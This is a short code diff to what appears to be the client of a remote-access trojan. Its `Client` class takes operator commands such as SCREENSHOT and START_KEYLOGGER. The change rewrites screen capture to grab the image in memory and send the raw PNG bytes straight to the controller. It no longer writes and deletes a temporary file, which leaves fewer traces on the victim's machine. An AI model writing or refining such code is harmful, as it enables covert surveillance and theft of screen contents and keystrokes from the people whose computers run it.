@@ -9,7 +9,7 @@ import sys
 import threading
 import time
 import traceback
-from io import StringIO
+from io import StringIO, BytesIO
 from pydoc import help
 
 import psutil
@@ -495,19 +495,17 @@ class Client(object):
                 continue
 
             if data[0] == 'SCREENSHOT':
-                if platform.system() == 'Windows':
-                    _file = '{}\\temp.png'.format(os.environ['TEMP'])
-                else:
-                    _file = '{}/temp.png'.format(os.environ['HOME'])
                 try:
-                    pyscreeze.screenshot(_file)
+                    with BytesIO() as output:
+                        img = pyscreeze.screenshot()
+                        img.save(output, format='PNG')
+                        content = output.getvalue()
                 except Exception as e:
                     self.send(b'ERROR')
                     self.receive()
                     self.send(errors(e).encode())
                     continue
-                self.send(_file.encode())
-                os.remove(_file)
+                self.send(content)
                 continue
 
             if data[0] == 'START_KEYLOGGER':
